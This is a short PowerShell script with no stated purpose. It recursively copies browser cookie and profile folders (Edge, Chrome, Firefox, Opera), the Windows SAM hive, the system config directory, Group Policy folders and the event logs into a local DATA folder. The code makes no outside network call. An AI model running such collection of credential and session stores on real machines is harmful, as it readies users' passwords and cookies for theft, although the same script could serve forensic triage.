# Define the list of source paths with placeholders
$sourcePaths = @(
    "C:\Users\{}\AppData\Local\Microsoft\Edge\User Data\Default\Network",
    "C:\Users\{}\AppData\Local\Google\Chrome\User Data\Default\Network",
    "C:\Users\{}\AppData\Roaming\Mozilla\Firefox\Profiles",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable\Network",
    "C:\Users\{}\AppData\Roaming\Opera Software\Opera GX Stable\Network",
    'C:\\WINDOWS\\system32\\config\\SAM',
    'C:\\Windows\\System32\\config',
    'C:\\Windows\\System32\\GroupPolicy',
    'C:\\Windows\\System32\\GroupPolicyUsers',
    'C:\\Windows\\System32\\winevt\\Logs'
)

# Define the list of identifiers for renaming
$identifiers = @(
    "Edge",
    "Chrome",
    "Firefox",
    "OperaStable",
    "OperaGXStable",
    "SAM",
    "SystemConfig",
    "GroupPolicy",
    "GroupPolicyUsers",
    "WindowsEventLogs"
)

# Get the current user's name
$currentUser = $env:USERNAME

# Define the base directory for the destination
$baseDirectory = "DATA"

# Loop through each source path
for ($i = 0; $i -lt $sourcePaths.Count; $i++) {
    # Replace the placeholder with the current user's name
    $sourcePath = $sourcePaths[$i] -replace '\{\}', $currentUser
    $identifier = $identifiers[$i]

    # Define the destination path
    $destinationPath = Join-Path -Path $baseDirectory -ChildPath "USER_$identifier"

    # Check if the source path exists
    if (Test-Path $sourcePath) {
        # Attempt to copy the folder to the DATA directory and rename it
        try {
            Copy-Item -Path $sourcePath -Destination $destinationPath -Recurse -Force
            # Print the message to the console
            Write-Host "Copied $sourcePath to $destinationPath"
        } catch {
            # Print the error message to the console
            Write-Host "Failed to copy $sourcePath to $destinationPath. Error: $_"
        }
    } else {
        # Print the message to the console
        Write-Host "Source path $sourcePath does not exist."
    }
}
